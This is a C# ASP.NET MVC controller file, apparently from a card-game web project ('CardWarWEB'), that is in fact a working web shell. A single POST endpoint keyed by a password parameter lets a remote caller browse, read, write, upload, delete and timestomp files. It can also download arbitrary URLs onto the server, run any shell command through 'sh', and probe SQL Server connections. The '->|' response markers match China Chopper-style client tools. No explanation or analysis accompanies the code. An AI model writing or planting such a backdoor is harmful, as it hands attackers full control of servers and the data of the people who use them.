using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNet.Mvc;
using Microsoft.AspNet.Http.Features;
using System.IO;
using System.Text;
using Microsoft.AspNet.Http;
using System.Net;
using System.Diagnostics;
using System.Data.SqlClient;
using System.Data;
using System.Runtime.InteropServices;

// For more information on enabling MVC for empty projects, visit http://go.microsoft.com/fwlink/?LinkID=397860

namespace CardWarWEB.Controllers
{
    [Route("Skzy")]
    public class SkzyController : Controller
    {

        [Route("Post")]
        [HttpPost]
        public string Post(string skzy0, string Z1, string Z2)
        {
            string Z = skzy0;//密码
            //Z = Request.ReadFormAsync().Result["skzy0"];
            string R = "";
            if (Z != "")
            {
                try
                {
                    switch (Z)
                    {
                        case "A":
                            {
                                ;
                                string[] c = new string[] { Directory.GetDirectoryRoot(Directory.GetCurrentDirectory()) }; R = string.Format("{0}\t", Server.MapPath("/")); for (int i = 0; i < c.Length; i++)
                                    R += c[i][0] + ":"; break;
                            }
                        case "B":
                            {
                                DirectoryInfo m = new DirectoryInfo(Z1); foreach (DirectoryInfo D in m.GetDirectories())
                                { R += string.Format("{0}/\t{1}\t0\t-\n", D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss")); }
                                foreach (FileInfo D in m.GetFiles())
                                {
                                    R += string.Format("{0}\t{1}\t{2}\t-\n", D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"),
D.Length);
                                }
                                break;
                            }
                        case "C":
                            {
                                FileStream fs = new FileStream(Z1, FileMode.Open, FileAccess.ReadWrite);
                                StreamReader m = new StreamReader(fs); R = m.ReadToEnd(); fs.Close(); m.Close(); break;
                            }
                        case "D":
                            {
                                FileStream fs = new FileStream(Z1, FileMode.Open, FileAccess.ReadWrite);
                                StreamWriter m = new StreamWriter(fs); m.Write(Z2); R = "1"; fs.Close(); m.Close(); break;
                            }
                        case "E":
                            {
                                if (Directory.Exists(Z1))
                                    Directory.Delete(Z1, true);
                                else System.IO.File.Delete(Z1); R = "1"; break;
                            }
                        case "F":
                            {
                                FileStream fs = new FileStream(Z1, FileMode.Open, FileAccess.ReadWrite);
                                byte[] datas = new byte[fs.Length];
                                fs.Read(datas, 0, Convert.ToInt32(fs.Length));
                                HttpContext.Response.Clear(); HttpContext.Response.WriteAsync("\x2D\x3E\x7C");
                                HttpContext.Response.Body.Write(datas, 0, Convert.ToInt32(fs.Length));
                                HttpContext.Response.WriteAsync("\x7C\x3C\x2D"); fs.Close(); goto End;
                            }
                        case "G":
                            {
                                byte[] B = new byte[Z2.Length / 2];
                                for (int i = 0; i < Z2.Length; i += 2) { B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16); }
                                FileStream fs = new FileStream(Z1, FileMode.Create);
                                fs.Write(B, 0, B.Length); R = "1"; fs.Close(); break;
                            }
                        case "H": { CP(Z1, Z2); R = "1"; break; }
                        case "I":
                            {
                                if (Directory.Exists(Z1))
                                { Directory.Move(Z1, Z2); }
                                else { System.IO.File.Move(Z1, Z2); }
                                break;
                            }
                        case "J": { Directory.CreateDirectory(Z1); R = "1"; break; }
                        case "K":
                            {
                                DateTime TM = Convert.ToDateTime(Z2); if (Directory.Exists(Z1))
                                {
                                    Directory.SetCreationTime(Z1, TM); Directory.SetLastWriteTime(Z1, TM);
                                    Directory.SetLastAccessTime(Z1, TM);
                                }
                                else { System.IO.File.SetCreationTime(Z1, TM); System.IO.File.SetLastWriteTime(Z1, TM); System.IO.File.SetLastAccessTime(Z1, TM); }
                                R = "1"; break;
                            }
                        case "L":
                            {
                                HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(Z1)); RQ.Method = "GET";
                                RQ.ContentType = "application/x-www-form-urlencoded"; HttpWebResponse WB = (HttpWebResponse)RQ.GetResponseAsync().Result;
                                Stream WF = WB.GetResponseStream(); FileStream FS = new FileStream(Z2, FileMode.Create, FileAccess.Write); int i; byte[] buffer = new byte[1024];
                                while (true) { i = WF.Read(buffer, 0, buffer.Length); if (i < 1) break; FS.Write(buffer, 0, i); }
                                R = "1"; WF.Close(); FS.Close();
                                break;
                            }
                        case "M":
                            {

                                Process p = new Process();
                                p.StartInfo.FileName = "sh";
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.StartInfo.CreateNoWindow = true;
                                p.Start();
                                p.StandardInput.WriteLine(Z2);
                                p.StandardInput.WriteLine("exit");
                                R = p.StandardOutput.ReadToEnd();
                                p.Dispose();
                                break;
                            }
                        case "N":
                            {
                                string strDat = Z1.ToUpper(); SqlConnection Conn = new SqlConnection(Z1);
                                Conn.Open(); R = Conn.Database + "\t"; Conn.Close(); break;
                            }
                        case "O":
                            {
                                /*string[] x = Z1.Replace("\r", "").Split('\n'); string strConn = x[0], strDb = x[1];
                                SqlConnection Conn = new SqlConnection(strConn); Conn.Open();
                                DataTable dt = Conn.GetSchema("Columns"); Conn.Close(); for (int i = 0; i < dt.Rows.Count; i++)
                                { R += string.Format("{0}\t", dt.Rows[i][2].ToString()); }*/
                                break;
                            }
                        case "P":
                            {
                                /*string[] x = Z1.Replace("\r", "").Split('\n'), p = new string[4];
                                string strConn = x[0], strDb = x[1], strTable = x[2]; p[0] = strDb; p[2] = strTable; SqlConnection Conn = new SqlConnection(strConn);
                                Conn.Open(); DataTable dt = Conn.GetSchema("Columns", p); Conn.Close(); for (int i = 0; i < dt.Rows.Count; i++)
                                {
                                    R += string.Format("{0} ({1})\t", dt.Rows[i][3].ToString(), dt.Rows[i][7].ToString());
                                }*/
                                break;
                            }
                        case "Q":
                            {/*
                                string[] x = Z1.Replace("\r", "").Split('\n');
                                string strDat, strConn = x[0], strDb = x[1]; int i, c; strDat = Z2.ToUpper(); SqlConnection Conn = new SqlConnection(strConn);
                                Conn.Open(); if (strDat.IndexOf("SELECT ") == 0 || strDat.IndexOf("EXEC ") == 0 || strDat.IndexOf("DECLARE ") == 0)
                                {
                                    SqlDataAdapter OD = new SqlDataAdapter(Z2, Conn); DataSet ds = new DataSet(); OD.Fill(ds); if (ds.Tables.Count > 0)
                                    {
                                        DataRowCollection rows = ds.Tables[0].Rows; for (c = 0; c < ds.Tables[0].Columns.Count; c++)
                                        {
                                            R += string.Format("{0}\t|\t", ds.Tables[0].Columns[c].ColumnName.ToString());
                                        }
                                        R += "\r\n"; for (i = 0; i < rows.Count; i++)
                                        { for (c = 0; c < ds.Tables[0].Columns.Count; c++) { R += string.Format("{0}\t|\t", rows[i][c].ToString()); } R += "\r\n"; }
                                    }
                                    ds.Clear(); ds.Dispose();
                                }
                                else {
                                    SqlCommand cm = Conn.CreateCommand(); cm.CommandText = Z2; cm.ExecuteNonQuery();
                                    R = "Result\t|\t\r\nExecute Successfully!\t|\t\r\n";
                                }
                                Conn.Close();*/
                                break;
                            }
                        default: goto End;
                    }
                }
                catch (Exception E)
                { R = "ERROR:// " + E.Message; }
                return "\x2D\x3E\x7C" + R + "\x7C\x3C\x2D";
                End:;

            }
            return "";
        }

        private void CP(String S, String D)
        {
            if (Directory.Exists(S))
            {
                DirectoryInfo m = new DirectoryInfo(S);
                Directory.CreateDirectory(D); foreach (FileInfo F in m.GetFiles()) { System.IO.File.Copy(S + "\\" + F.Name, D + "\\" + F.Name); }
                foreach (DirectoryInfo F in m.GetDirectories()) { CP(S + "\\" + F.Name, D + "\\" + F.Name); }
            }
            else { System.IO.File.Copy(S, D); }
        }
    }
}
